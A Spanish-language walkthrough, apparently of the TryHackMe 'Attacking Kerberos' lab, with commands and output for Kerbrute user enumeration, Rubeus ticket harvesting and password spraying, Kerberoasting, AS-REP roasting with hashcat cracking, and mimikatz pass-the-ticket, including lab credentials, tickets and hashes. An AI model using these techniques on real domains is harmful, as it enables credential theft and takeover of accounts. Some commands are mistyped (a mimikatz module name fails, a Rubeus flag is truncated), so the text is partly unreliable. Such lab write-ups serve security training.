https://medium.com/@ocdbytes/attacking-kerberos-tryhackme-6c9ecf90e5c6

xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.201.0.52 /u:Administrator /p:'P@$$W0rd'



evil-winrm -i 10.201.0.52 -u Administrator -p 'P@$$W0rd' 


. Aumentar memoria swap temporalmente:
bash
# Crear swap adicional de 2GB
sudo fallocate -l 2G /tmp/swapfile
sudo chmod 600 /tmp/swapfile
sudo mkswap /tmp/swapfile
sudo swapon /tmp/swapfile

# Verificar swap
free -h



# Qué es Kerberos?

Kerberos es el servicio de autenticación predeterminado para los dominios de Microsoft Windows. Se pretende que sea más "seguro" que NTLM mediante el uso de autorización de tickets de terceros, así como un cifrado más sólido. Aunque NTLM Tiene muchos más vectores de ataque para elegir Kerberos Todavía tiene un puñado de vulnerabilidades subyacentes como NTLM que podemos utilizar a nuestro favor.

- Billete Concesión de Billete (TGT) - Un ticket de concesión de tickets es un ticket de autenticación que se utiliza para solicitar tickets de servicio del TGS para recursos específicos del dominio.
- Centro de distribución de claves (KDC) - El Centro de Distribución de Claves es un servicio de emisión de TGT y tickets de servicio que consta del Servicio de Autenticación y el Servicio de Concesión de Tickets.
- Servicio de autenticaciónhielo (AS) - El Servicio de Autenticación emite TGT para que los utilice el TGS en el dominio solicitar acceso a otras máquinas y tickets de servicio.
- Servicio de concesión de billetes (TGS) - El Servicio de Concesión de Billetes toma el TGT y devuelve un ticket a una máquina en el dominio.
- Nombre principal del servicio (SPN) - Un nombre principal de servicio es un identificador proporcionado a una instancia de servicio para asociar una instancia de servicio con una cuenta de servicio de dominio. Windows requiere que los servicios tengan una cuenta de servicio de dominio, por lo que un servicio necesita un conjunto SPN.
- Clave secreta a largo plazo de KDC (clave LT de KDC) - La clave KDC se basa en la cuenta de servicio KRBTGT. Se utiliza para cifrar el TGT y firmar el PAC.
- Clave secreta a largo plazo del cliente (clave LT del cliente) - La clave del cliente se basa en la computadora o cuenta de servicio. Se utiliza para comprobar la marca de tiempo cifrada y cifrar la clave de sesión.
- Clave secreta de servicio a largo plazo (clave de servicio LT) - La clave de servicio se basa en la cuenta de servicio. Se utiliza para cifrar la parte de servicio del ticket de servicio y firmar el PAC.
- Clave de sesión - Emitido por la KDC cuando a TGT se emite. El usuario proporcionará la clave de sesión al KDC junto con la TGT al solicitar un ticket de servicio.
- Certificado de atributo de privilegio (PAC) - El PAC contiene toda la información relevante del usuario, se envía junto con el TGT al KDC que será firmado por la Clave LT de destino y la Clave LT del KDC para validar al usuario.




## Kerbrute

Kerbrute es una herramienta de enumeración popular que se utiliza para forzar y enumerar usuarios válidos del directorio activo abusando del Kerberos preautenticación.

Necesitas agregar el DNS nombre de dominio junto con la IP de la máquina a/etc/hosts dentro de su máquina atacante o estos ataques no funcionarán para usted MACHINE_IP  CONTROLLER.local    

### Descripción general del abuso previo a la autenticación -

Al forzar la autenticación previa de Kerberos, no activa el evento de inicio de sesión fallido de la cuenta, lo que puede generar señales de alerta para los equipos azules. Al realizar fuerza bruta a través de Kerberos, puede realizar fuerza bruta enviando solo un único marco UDP al KDC, lo que le permite enumerar los usuarios del dominio desde una lista de palabras.

### Instalación de Kerbrute

1. Descargue un binario precompilado para su sistema operativo 
    - https://github.com/ropnop/kerbrute/releases

2. Cambiar el nombre de kerbrute_linux_amd64 to kerbrute

    - rename kerbrute_linux_amd64 to kerbrute

3. Dar permisos a kerbrute de ejecucion
    - chmod +x kerbrute

### Enumeración de usuarios con Kerbrute

Enumerar usuarios le permite saber qué cuentas de usuario están en el dominio de destino y qué cuentas podrían usarse potencialmente para acceder a la red.

- Tener una lista de Usuarios (https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt)

#### Esto forzará las cuentas de usuario desde un controlador de dominio utilizando una lista de palabras proporcionada


```bash
kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

* EJEMPLO DE SALIDA

```bash
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/05/25 - Ronnie Flathers @ropnop

2025/08/05 15:18:51 >  Using KDC(s):
2025/08/05 15:18:51 >  	CONTROLLER.local:88

2025/08/05 15:18:51 >  [+] VALID USERNAME:	 admin1@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 administrator@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 admin2@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 httpservice@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 machine1@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 machine2@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 sqlservice@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 user1@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 user2@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 user3@CONTROLLER.local
2025/08/05 15:18:51 >  Done! Tested 100 usernames (10 valid) in 0.034 seconds
root@ip-10-201-12-168:~/Downloads/kerberos# 
```







# Rubeus 

Es una potente herramienta para atacar Kerberos.

Rubeus cuenta con una amplia variedad de ataques y funciones que lo convierten en una herramienta muy versátil para atacar Kerberos. Algunas de estas herramientas y ataques incluyen el overpass hash, las solicitudes y renovaciones de tickets, la gestión de tickets, la extracción de tickets, la recolección de tickets, el pass the ticket, el asado de AS-REP y el asado de Kerberos.

La herramienta tiene demasiados ataques y funciones como para cubrirlos todos, así que solo cubriré los que considero más cruciales para comprender cómo atacar Kerberos. Sin embargo, les recomiendo investigar y aprender más sobre Rubeus y su amplia gama de ataques y funciones aquí: https://github.com/GhostPack/Rubeus

#### Este comando le dice a Rubeus que recolecte TGT cada 30 segundos

```bash
Rubeus.exe harvest /interval:30
```

```bash
  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  8/5/2025 7:51:31 AM
  EndTime               :  8/5/2025 5:51:31 PM
  RenewTill             :  8/12/2025 7:51:31 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket



  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  8/5/2025 6:27:27 AM
  EndTime               :  8/5/2025 4:27:27 PM
  RenewTill             :  8/12/2025 6:27:27 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :
```

# Fuerza bruta / Password-Spraying com Rubeus

Rubeus puede forzar contraseñas como spray  contraseñas de cuentas de usuario. Al forzar contraseñas, se utiliza una única cuenta de usuario y una lista de palabras de contraseñas para ver qué contraseña funciona para esa cuenta de usuario determinada. Al rociar contraseñas, usted proporciona una única contraseña, como Password1 y "spray", contra todas las cuentas de usuario encontradas en el dominio para encontrar cuál puede tener esa contraseña.

Este ataque tomará una contraseña determinada basada en Kerberos y la rociará contra todos los usuarios encontrados y les dará un ticket .kirbi. Este ticket es un TGT que se puede utilizar para obtener tickets de servicio del KDC, así como para ser utilizado en ataques como el ataque de pasar el ticket.

Antes de rociar contraseñas con Rubeus, debe agregar el nombre de dominio del controlador de dominio al archivo host de Windows. Puede agregar la IP y el nombre de dominio al archivo de hosts desde la máquina usando el comando echo: 


#### Se debe agregar el nombre de dominio del controlador de dominio al archivo host de Windows. Puede agregar la IP y el nombre de dominio al archivo de hosts desde la máquina usando el comando echo:

```bash
echo 10.201.0.52 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```


#### Esto tomará una contraseña determinada y la "rociará" contra todos los usuarios encontrados y luego dará el .kirbi TGT para ese usuario 

```bash
./Rubeus.exe brute /password:Password1 /noticke
```

```bash
PS C:\Users\Administrator\Downloads> ./Rubeus.exe brute /password:Password1 /noticket

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7VcjvanOKiue00ZwBqUmrrfvg+Nulw5Nm9tC93Y6hFWimQCZpz+X2VpvWXAncyMnASu0r5PoG8R9
      BFhTW0CFGMlbChu7h7/Vdb15pCqvAZzbyz8T4z8JXCzxYorWQRaCxAM1Vt1X7jkcqYbY4t5B8kkFqe01
      m5TAqIWfJFXn5787VZMTpz4wtT6YCgSwKdaQSyZ7A3u214l9IkDoo8RLqG9ORQmHNzcpT2aRD+nWJ8fP
      UucVn1p34tsvwmqjGBSq1NAeNfSh9726AfyPE4NfTg7rOE3AYk4/gxptIlJakVzHf4po00Wj7RUYUbtF
      BXIKJ2Go3wibzfYYI+ObAo1DDh58Vto7+x7F923PQ9w0adAxj5GBHjeoNO/c1gFFmh06UzII1dYEWDaz
      kFOkDTdg7LZL91frxkKFMiv9k6z02bhtPixDgdmq3LITwb6xeSLMTOE3s/2ZcqaGe64POh2jC3hYCpcE
      DhHKxG6/h3TYi7ty+8uqpCgksCrozeVZUx6JLWUtuH7y6EfcgonqrRzwDOPz2BNjKmdKfY79FmR/FZAF
      6vcKwt8VhbvtKf6kXUNC4UdHvfqyqgpDBUcGBBOjkXKLsKRkZ4uSXQYdQ8MJVCLHQM3XYClb6EV8ES0X
      i1Vejubw/Mr4Zp5Roy0zZ3+tRGfO28leJpEEBJs0rE+C1z6oRl+LbGjcmH6pCSIXLxBZQZP4nUPJYCQV
      ZiDfZR+/7YUtbpYqMSyp0jp1sOTHQMD5+R14s63iLeLpfS5ke6F5RcxMrar9qdnos2QYHK5zEhfOZcTc
      dE5BsF0MNAgYkJaUDHX5r3zwIyT5xjHsj1eClczB1/kakzO1+YbYJY1MMvRKJtQulXf6AEmy65fGJi8S
      3JRKzRxiBIl0fvTg5PaCzhv+VJLwqnna014g4gvteOByyA0YS7twoavcjp/KL6bXw7GQ9oBdl8+x1yuB
      X8NDZF+DN4TN4XzG9WQ/qvTPIwI6AH8FcmARm6BXpLGsSD7r7HPHIaiutf3QxJJYB0QfvWFA2hzWWOLc
      P8uZSiEYe7qlAyjlXATmtziZ4jD9WYS/yaGeCUFTARUPQoRAAWtnuyU1/mkMswS3BLgSf5LpcAk8Vwbg
      2uuGTgOGc70b9D4FU58Ee9tdAs+k2BU0EH+nDj2YxnH99G+YEwllZPPqXEkHixSHW2NQaYzxKRmwGQyK
      RTr9/kLXMUZW0vMxrUZI41knOxvFZdigHc25tmXSShZlw3x+DdW7C7G8nrHaOc+BLZe68xrgKFShAwOy
      Dp7uJNm+VelDPsrnvqZ4klYfC3T5zfM4IeEcXpTL465n3DqEa9KoXPLjdz9/X9ABKqOB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIHOHarNQ0ShrkldycGHTa1LkxdNVN3BlXP0L
      upnccDyboRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDI1MDgyMDIwMDk0M1qmERgPMjAyNTA4MjEwNjA5NDNapxEYDzIwMjUwODI3MjAwOTQzWqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs
```








# Kerberoasting con Rubeus e Impacket


Kerberoasting permite a un usuario solicitar un ticket de servicio para cualquier servicio con un SPN registrado y luego usar ese ticket para descifrar la contraseña del servicio. Si el servicio tiene un SPN registrado, entonces puede ser Kerberoastable; sin embargo, el éxito del ataque depende de qué tan segura sea la contraseña y si es rastreable, así como de los privilegios de la cuenta de servicio pirateada. Enumerar Kerberoastable cuentas Sugeriría una herramienta como BloodHound para encontrarlo todo Kerberoastable cuentas, te permitirá ver qué tipo de cuentas puedes kerberoastsi son administradores de dominio y qué tipo de conexiones tienen con el resto del dominio. 

https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt


### Esto volcará el hash de Kerberos de cualquier usuario de kerberoastable    
```bash
Rubeus.exe kerberoast 
```
```bash
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip [Target IP] -request
```

```bash
 kerberoastable users : 2


[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : 
$krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local:30111*$BA9EABAA4D0BF7BF556A7B135107AE40$48483952BD1B0BD7FC1930F47FE690E3D45BBEFDA5977F2277BB2D982C4716EB07EF20F3A7F6B3D987D1F1A2003D51BA7F5DDEC8332FC5CA3B390D510A5BD4CB861B2AA09677C6AEEFD1F38BF24591EB66CE9F61F9F78A0AE6654335CCD9272F134C35C7625041A4463C9A5B861F86CBDE53825ABF4D8B584EEFDA658C0FF38E1928DBD17C7A74F085D2277B4EDD6CC3973D420E5E0FAAF6DFEE8F2BFB3E9BA2036D3B08374C0F879AC006239AECFD4AB571FE76FB7EE7B91C17D2E064AB4DBC92969ABC95D9D98CF1ABE9B8ECD83C2DB1CE0D8F0325723A1F74152D87218B4C2E31A091459716B24DD510414EFAA07770563617747A31D50486D4C4E2CFF25F3A6C151B48636A64EDA6C3F88BABBBBFDD6A73B93EE90C4FE9ABF8D6ADFA22A300AAAC81DEF72D99B629BE8EE043BC4608D8E6CEC14F9CF4BF70241F8AB7DFC2076ED27E18DEE6BFC51D08823114090D96E982301A59ACE851C9B4EDBF18213D6B600B2D72FFD376E3E4DA8ACACEA214EB2E0170AB3D993626FE0594C5EC1A0C142555A5A7CC0FB083A6B3FE03D2481C004533AE1EB239379304CC32BBF5AF216D7963CBEF6071FBF6A5585CBFE41D04D7DD98AE809B3FF0A06CE0DD5CB7DA9943174EA6564587D38899693EC0D47D0CF2A6B992F730FDC3464A7A8DC075ED1CBA02362C91CE2110B96443AD03CB18BC75555A6594AA43EE198808D8A178111DED7BB58BCDF6C95499C80E90B22E107CFE05EBED4C17D770ACB391B27595C8384460544DFE704CC859443D3E5E51049892FF7306032FD3C3FB949839D79EB9E5B53EA6A91BD069E0D01040C739FAD70C96E274E28FB1BB27C3A950CDD98C2B566E3C5DA5C4F351DDF122466BAF78E5C40C47D2A1B85250C8321DF3E5603950C565563C512A7F91405ADFC09A792E8A0114AED5F3A4BF069E0D77995F5F966E881DEC1BAC2A201DB7474595B71CBE74E3D6D504A229A21A791F0C980963E2A3272829C8D138BC6B999443DF7A20507D2D62DDD83C5ED3363F9C3314F18238C7023B0C5A891CFFC2802523777C001611794D55152930A4C047FE5C870D3F8D10A76C475ADA150AD240A6F70C0950CAB7E755CB3A73421188E1DFDC9D3808B78B313CAFA046D5A686CEC50E84501CBB0974A51C10ED6B9B923CEC71A38B5CA14C377FFB2B3E1D39BB7071283B9E33B6FEA9960FBC5B27F98E972B054801E44BE08F02DAE037B92741B0D05C0C804CFEAC39F24ABAAF65CA2FDF064A49A2123EC79017E934850BA5B91DB51828FB580ED131148A2D71E3A447F203599393DFFED34C50911F0E929167CDBFCED6949CB548E7AE5F826B3CCA2C0CB12465CAF2626F8818E792A50C89E9FD7CBB5E2E59972A4807F1149D9ABB7656427607DEDD28A2C990977451938564A443E044ECFB54CC99F71C201184B92910FB089335D7B7A836940847A410851B37292C85E943BCB135DB5F0A156EE606ABB610085450E2E1A79B1C399B803C5EAF8270B7E2C7D9E14BBB26EAECFEDFF17C91C556B7F0FB0D53D985C680F3D8EDE008C2F478FF3F5415429BEA02AE89300489958DDEF9DFAE307BFCF2BDAAB38C67F4188D50A3F3904FA424A7D9C6EC4164EEDD70393A98ECF255C5FFBE80F130B954D58580FCF5A013


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : 
$krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.local:30222*$83631E50988963B7B66BFFF64EFE50D5$62734B2939E0979E3D70D3C034D6F1FA4F6CC50BAFB506C63076E74A93D02D3DDE6B425DFF7756463D80A74951EE009C79FAD156EB1B22D849B4A4F34E389330696CB4E15E34C31B621074E13430DB1A3CD1B706A3BEC6385D6D6D1D3AE2D4DBFB9DA8F660ACBEA5D990D7C04FE6701B5899641C77E23219D1424E315D774DD61545F99760B3BC3DC5EF46D31C7B0D1320B7F1E413467B769245437AA4DBDA1141C021700B6559972FB1A4D20FAE36FAA6D92180FBD8E2D6C65E406C16E54BBE422143998B8B632C77F22139C5E76D8E29B6FEEE2F6CF62CD863AF56DFD6AD420DFEC9331314A957F829A6229B67409AA101F60350F6D7E1379E376CEE5A85CE41F9E387AAE27C17C3A111299D24434BFCFFC8945CC13D76FC6DB4907351851C767256E2255C68E62799E34741913EDE73B1F4FA90AA827E2E77F91D89F2D36D09F88435D3A2BB23D6922506066A7E75D3D1763F9544FEE5F6723F40867B1FF9D8B09318B2954F4F0163B03ACEE43971BACACA289B79127ECB1167EF834DF2A333F9AC651588A20B8E2B8BAF34247914A3030AB052B651FDC8B6890DB05FFEA66108BB66D385664A4F8D117959DACD3A9A8567DD512416DACE2B18831E7116F5EFCED2ECDC2EF8C19BBC68D4D8FF08680FDC89B08B958AD3155D58C4170C83392294EED654B44D77392FDE9BCAFA11378E3A78DB9E21A044734BE65AD02A018B6883BE1FC47FBD89BA72796307E014DFBB7D728124F9E03FB2CE28E8D6B9B034E79A74F8DEA5B2F23500197FB5AB7B959149EB4B0E0232846B060603C2B89EF3BFDE20D1DBEAAE2310E65A992AADE0040589CF5860B02EEF2211AF82DA92B43DBAD40637DA009A49C5AB53E4E246F0BAA90A94FED1D6D7EB8DB2F9704BDC43B94C9E28C5E4D98BD4A9BD693AF1D75E962ED4B10D6B61C74429D9734A21828E8A503F4A0B65428B17F856925F0C41728A43A55BAC1EC7EA407ADDED0ED19F5C860E3472DBF18208C001CBA73BC1439DD56BEADA1CAEEF74E801D2B4CB3BD9869397C1579425EB8B176BD193C15B2787D4241115FB6F8FBFB73FFBE1A5CF39AC3367736C79724FAE3B3393B91C3B0007EE42A8D99E9DB6B767613E2DCB1C7E95BFF430C168EDEA556580CC80C8085F4F2CA00778E3A8CC93041871459F753ECCDD96A2C4547F082BDC66B9CB3417B0EFF880EF4F93332BBA4F79DF9D7504BE1EB10A32A04BEAFF9EAE1438007E81BF72E345575BCCE7DE36FE4585694999A63B198834957BB937FCAF95E9E029E6C677AB7C3A34390CE7A9C704883BDF49819AC3343B6C2B54A4F529D713438A67BF0ACE643275456B164E5FB37F2FCBB262E480FAFD06C25F8AEA71D01870DEF56F268012C5B3AA787B1608AF89FC289EC1266CD2D42E30EDCB5FB21826B4B8F1C9C898E154D2867BD5E1130FAE3A4EB6D4EA6379BF56793D609CAE0ED65695D0D61C57B18E7230C0A09578BD295517609A92F83AEF58A57E9D63E5BF24FAD8254229C9D21E2BDAF8498B45FA1967065ACAE84F9C51A2A23D0A2F2BDD2F229E6517AC99FF71DC192ED550BEB3A081E1807DCE55821CB5B657DEDC261A5ADCAC0C515F75E6BD220856A4AB92346B97CE86CCA0D4B82C33866E5409493DDDD60F6F7D7163



```

### Copia el hash en tu máquina atacante y colócalo en un archivo .txt para que podamos descifrarlo con hashcat


```bash
hashcat -m 13100 -a 0 hash.txt Pass.txt


SQLService: MYPassword123#
HTTP Service: summer2020
```



# Method 2 - Impacket

Impacket Installation - 

Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20

1.) cd /opt navigate to your preferred directory to save tools in 

2.) download the precompiled package from https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19


sudo unzip impacket-impacket_0_9_19.zip -d /opt



3.) cd Impacket-0.9.19 navigate to the impacket directory

4.)          pip install .

 - this will install all needed dependencies

# Kerberoasting w/ Impacket - 

1.) cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located

2.) sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.201.0.52 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash


sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.201.0.52 -request


---






# Roasting AS-REP -

Durante la preautenticación, el hash del usuario se utilizará para cifrar una marca de tiempo que el controlador de dominio intentará descifrar para validar que se esté utilizando el hash correcto y que no se esté reproduciendo una solicitud anterior. Tras validar la marca de tiempo, el KDC emitirá un TGT para el usuario. Si la preautenticación está deshabilitada, se pueden solicitar datos de autenticación para cualquier usuario y el KDC devolverá un TGT cifrado que se puede descifrar sin conexión, ya que el KDC omite el paso de validar que el usuario sea realmente quien dice ser.

*  ejecuta el comando AS-REP roast en busca de usuarios vulnerables y luego volca los hashes encontrados.
```bash
Rubeus.exe asreproast
```


```bash
PS C:\Users\Administrator\Downloads> ./Rubeus.exe asreproast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::fcc5:8576:628d:abf5%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

$krb5asrep$23$Admin2@CONTROLLER.local:E93F0D5BEA75392744107C2DC0D4D7A5$BAEB18E4D973DE2299B008F4C23A097473F60DC6594184B73E1E2FD6484CCD22160661FA28CD6351A224F0838226055C3A79C61AE1AA7DB2B37B94B0C6D90B4A4A91FE4D5B40131D80313C6FD365C7B3F957726D28203939C802688C8D38389E69E8F7EF011A3E6AF04F4E2C1A0AA260A4495945A7C9696C29C6396E15FEAED02DF484342F3A9DB241FDD5F0AAE40BE8A8FBAEBBB53EC62800D3753A55472D09CB85405C7AE1F93C967B20EB6CD2155160AB21E0B8D796A50A6E334E93321A735CCAE465CBC38817BBC952042E44D577BF52EE8E7FC230A9E3C576544514780F49E13CA97900BF9E8AA87AFC3FC595E82B9A1465

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::fcc5:8576:628d:abf5%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

$krb5asrep$23$User3@CONTROLLER.local:8853684F86174CB9B55C6521A1D8C8A2$39A645397D8F4FA3D7235337C39E127331572B164823BF61CCFE9B9A2EAA74D6D7925756189181DFBCD18195B3867A62BA9FCCEA2E047502743C502DCE6E2D508920E12BC440D84FEE3F1F47DDA6DC6ECC90ACBF8547911BFC307AF5B93CC7977796F213A6C9055EFDE72EC74E012AF32EB23035026E2A360B6BB5364F796BE14790BD1B68A6C813DA64DB59587373F833FFFE062B88B4D7B638A53CF7070B6D89A4D90055F2B20F1F05D65A4B248F2CFDB91D9548A1B1F0F5B05B344F398A20B89C30EFC23D2C3CDA3D13EF80ED508B251B1A8532B3DCEF20E14A45BCB00F5874E2F28756B9014EAEECCDC39E82B1AFC73188AE

PS C:\Users\Administrator\Downloads>
```

### Ahora guarde ambos hashes con el nombre hash1.txt y hash2.txt (* imp: recuerde agregar 23$ en el hash después de $krb5asrep$) y descifremos todas las contraseñas:

```
hashcat -m 18200 Hash1.txt Pass.txt 
# P@$$W0rd2  
hashcat -m 18200 Hash2.txt Pass.txt 
# Password3
```




    https://medium.com/@ocdbytes/attacking-kerberos-tryhackme-6c9ecf90e5c6

    https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt




# Mimikatz 

Es una herramienta de posexplotación muy popular y poderosa que se usa más comúnmente para volcar credenciales de usuario dentro de una red de directorio activo; sin embargo, usaremos mimikatz para volcar un TGT desde la memoria LSASS

Esta será solo una descripción general de cómo funcionan los ataques de pasar el ticket, ya que THM actualmente no admite redes, pero lo desafío a que lo configure en su propia red.

Pase la descripción general del boleto -

Pasar el ticket funciona descargando el TGT de la memoria LSASS de la máquina. El Servicio del Subsistema de Autoridad de Seguridad Local (LSASS) es un proceso de memoria que almacena credenciales en un servidor de directorio activo y puede almacenar tickets Kerberos junto con otros tipos de credenciales para actuar como guardián y aceptar o rechazar las credenciales proporcionadas.

Puedes volcar los tickets de Kerberos desde la memoria LSASS tal como puedes volcar hashes. Cuando vuelcas los tickets con mimikatz, nos dará un ticket .kirbi que se puede usar para obtener el administrador del dominio si hay un ticket de administrador del dominio en la memoria LSASS. Este ataque es excelente para la escalada de privilegios y el movimiento lateral si hay tickets de cuentas de servicio de dominio no seguros por ahí.

El ataque le permite escalar a administrador de dominio si volca el ticket de un administrador de dominio y luego se hace pasar por ese ticket usando el ataque PTT mimikatz que le permite actuar como administrador de ese dominio. Se puede pensar en un ataque de pasar el ticket, como reutilizar un ticket existente, no crear ni destruir ningún ticket aquí, simplemente reutilizar un ticket existente de otro usuario en el dominio y hacerse pasar por ese ticket.

### Para obtener tickets de la memoria lsass  

```
mimikatz.exe 
```
### this exportará todos los tickets .kirbi al directorio en el que se encuentra actualmente. En este paso, también puede usar los tickets codificados en base 64 de Rubeus que recopilamos anteriormente
```
privilege::debug
```
### Esto exportará todos los tickets .kirbi al directorio donde se encuentra actualmente.
### En este paso, también puede usar los tickets codificados en base 64 de Rubeus que recopilamos anteriormente.
```
securelsa::ticket /export 
```

```
C:\Users\Administrator\Downloads>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # securelsa::ticket /export
ERROR mimikatz_doLocal ; "securelsa" module not found !

        standard  -  Standard module  [Basic commands (does not require module name)]
          crypto  -  Crypto Module
        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
        kerberos  -  Kerberos package module  []
       privilege  -  Privilege module
         process  -  Process module
         service  -  Service module
         lsadump  -  LsaDump module
              ts  -  Terminal Server module
           event  -  Event module
            misc  -  Miscellaneous module
           token  -  Token manipulation module
           vault  -  Windows Vault/Credential module
     minesweeper  -  MineSweeper module
             net  -
           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
       busylight  -  BusyLight Module
          sysenv  -  System Environment Value module
             sid  -  Security Identifiers module
             iis  -  IIS XML Config module
             rpc  -  RPC control of mimikatz
            sr98  -  RF module for SR98 device and T5577 target
             rdm  -  RF module for RDM(830 AL) device
             acr  -  ACR Module

mimikatz # securelsa::ticket /export
ERROR mimikatz_doLocal ; "securelsa" module not found !

        standard  -  Standard module  [Basic commands (does not require module name)]
          crypto  -  Crypto Module
        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
        kerberos  -  Kerberos package module  []
       privilege  -  Privilege module
         process  -  Process module
         service  -  Service module
         lsadump  -  LsaDump module
              ts  -  Terminal Server module
           event  -  Event module
            misc  -  Miscellaneous module
           token  -  Token manipulation module
           vault  -  Windows Vault/Credential module
     minesweeper  -  MineSweeper module
             net  -
           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
       busylight  -  BusyLight Module
          sysenv  -  System Environment Value module
             sid  -  Security Identifiers module
             iis  -  IIS XML Config module
             rpc  -  RPC control of mimikatz
            sr98  -  RF module for SR98 device and T5577 target
             rdm  -  RF module for RDM(830 AL) device
             acr  -  ACR Module


```
### Elegir el [0;7a2df]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL


kerberos::ptt [0;7a2df]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi


```
mimikatz # kerberos::ptt [0;7a2df]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi

* File: '[0;7a2df]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi': OK

mimikatz # klist


